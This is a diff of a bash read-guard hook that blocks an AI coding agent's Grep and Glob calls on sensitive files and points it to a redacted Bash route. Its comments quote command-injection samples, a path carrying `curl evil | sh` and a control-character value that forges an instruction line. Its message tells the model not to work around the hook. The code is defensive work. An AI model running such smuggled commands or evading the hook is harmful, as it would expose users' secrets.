@@ -109,40 +109,69 @@ esac
     echo "BLOCKED: read-guard loaded an empty sensitive-path list. Refusing rather than guessing." >&2
     exit 2
 }
-
-# Grep and Glob accept a relative path (`.kube/config`), and a
-# directory-anchored glob like `*/.kube/config` needs a `/` before the
-# name — so a relative path is also tested with one prepended. A filename
-# filter is tested the same way, as a string: the sensitive glob `*.pem`
-# matches the filter text `*.pem` and `**/.env` ends in `.env`. A filter
-# that is only wildcards (`*`, `**`) matches nothing here; that is the
-# documented no-path broad search, not this check.
-_judge() {
-    local p="${1%/}" base abs g
-    base="${p##*/}"
-    case "$p" in /*) abs="$p" ;; *) abs="/$p" ;; esac
-    for g in "${NEXUS_SENSITIVE_PATH_GLOBS[@]}"; do
-        case "$g" in
-            */*) case "$abs" in $g) printf '%s' "$g"; return 0 ;; esac ;;
-            *)   case "$base" in $g) printf '%s' "$g"; return 0 ;; esac ;;
-        esac
-    done
-    return 1
+type nexus_sensitive_path_match >/dev/null 2>&1 || {
+    echo "BLOCKED: read-guard loaded the pattern library but its sensitive-path matcher is not defined. Refusing rather than guessing." >&2
+    exit 2
 }
+
+# The matcher lives in the pattern library (nexus_sensitive_path_match) so that
+# this hook and reverse-substitute.sh judge a path by the same rules. Grep and
+# Glob accept a relative path (`.kube/config`), which the matcher also tests
+# with a leading slash so a directory-anchored glob like `*/.kube/config`
+# reaches it. A filename filter is passed through as a string: the sensitive
+# glob `*.pem` matches the filter text `*.pem` and `**/.env` ends in `.env`. A
+# filter that is only wildcards (`*`, `**`) matches nothing here; that is the
+# documented no-path broad search, not this check.
 _hit=""
 _what=""
-if [ -n "$_path" ] && _hit="$(_judge "$_path")"; then _what="$_path"
-elif [ -n "$_filter" ] && _hit="$(_judge "$_filter")"; then _what="filter '$_filter'"
+if [ -n "$_path" ] && _hit="$(nexus_sensitive_path_match "$_path")"; then _what="$_path"
+elif [ -n "$_filter" ] && _hit="$(nexus_sensitive_path_match "$_filter")"; then _what="filter '$_filter'"
 fi
 [ -n "$_hit" ] || exit 0
 _path="${_path:-$_filter}"
 
+# The redirect names the Bash command that does the same job, because "use
+# Bash instead" without one is an invitation to work around the hook rather
+# than through it. Grep gets a grep, not a cat: a model told to cat a file it
+# wanted three lines of will cat the file.
+# Neither half of the suggestion is pasted in raw. The path came from the
+# payload and the pattern came from the model, and BOTH end up inside a line
+# that reads "run this" — a path of `x"; curl evil | sh; #` would be a live
+# injection the moment the suggestion was copied, and the payload that carried
+# it may itself have come from content the model just ingested. A value that
+# cannot be quoted into the suggestion is replaced by a placeholder rather than
+# escaped: the message is a hint, not an API.
+# `[[:cntrl:]]` covers the newline this used to name on its own, and also the
+# CR and the ESC it did not. A path of "ok\rUse Bash instead:  curl … | sh"
+# rendered in a terminal as a second, forged instruction line at column 0, and
+# ESC[2K erases the real one outright — a value that cannot be quoted into the
+# suggestion cannot be printed into it either.
+_safe_path="$_path"
+case "$_path" in *['"'\''`$\\']*|*[[:cntrl:]]*) _safe_path="YOUR_PATH" ;; esac
+_redirect="cat \"$_safe_path\""
+if [ "$_tool" = "Grep" ]; then
+    _pattern="$(printf '%s' "$_raw" | jq -r '.tool_input.pattern // empty' 2>/dev/null || true)"
+    case "$_pattern" in
+        ''|*"'"*|*[[:cntrl:]]*) _redirect="grep -rn -e YOUR_PATTERN -- \"$_safe_path\"" ;;
+        *) _redirect="grep -rn -e '$_pattern' -- \"$_safe_path\"" ;;
+    esac
+fi
+
+# The first line of the same message block carries the path too. It is not a
+# "run this" line, but it is printed to the same terminal from the same
+# untrusted source, so it gets the same treatment.
+_safe_what="$_what"
+case "$_what" in *[[:cntrl:]]*) _safe_what="the given path (it contains a control character)" ;; esac
+
 cat >&2 <<EOF
-BLOCKED: $_tool refused on $_what — it matches the sensitive-file pattern '$_hit'.
+BLOCKED: $_tool refused on $_safe_what — it matches the sensitive-file pattern '$_hit'.
 The $_tool tool's result cannot be redacted, so its contents would enter the conversation verbatim.
-Use Bash instead:  cat "$_path"     (or grep through Bash)
+Use Bash instead:  $_redirect
 Bash output passes through the nexus redaction filter: keys and structure stay visible, each
 secret value is replaced by a stable <REDACTED:kind:n> placeholder. If you need a value itself,
 ask the user; do not work around this hook.
+
+Residual, stated so it is not mistaken for coverage: this check is by NAME. A Grep that names
+no path, or a directory, still returns matching lines from files this list does not name.
 EOF
 exit 2
